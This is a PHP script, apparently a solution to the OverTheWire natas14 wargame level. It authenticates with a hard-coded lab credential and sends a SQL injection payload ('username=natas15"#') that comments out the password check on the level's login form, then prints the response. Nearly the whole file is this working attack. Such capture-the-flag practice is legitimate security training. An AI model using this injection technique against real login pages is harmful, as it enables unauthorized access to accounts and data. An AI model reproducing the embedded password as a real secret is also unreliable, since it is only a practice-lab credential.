<?php

$headers = array("Authorization: Basic ". base64_encode("natas14:Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1"));
$url = "http://natas14.natas.labs.overthewire.org/";

$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_RETURNTRANSFER,true);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
curl_setopt($curl, CURLOPT_COOKIEJAR, 'cookies.txt');
curl_setopt($curl, CURLOPT_COOKIEFILE, 'cookies.txt');
$out = curl_exec($curl);

$url = "http://natas14.natas.labs.overthewire.org/index.php?debug";
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, 1);
curl_setopt($curl, CURLOPT_COOKIEJAR, 'cookies.txt');
curl_setopt($curl, CURLOPT_COOKIEFILE, 'cookies.txt');
curl_setopt($curl, CURLOPT_POSTFIELDS, "username=natas15\"#&password=;");
$out = curl_exec($curl);
echo $out;

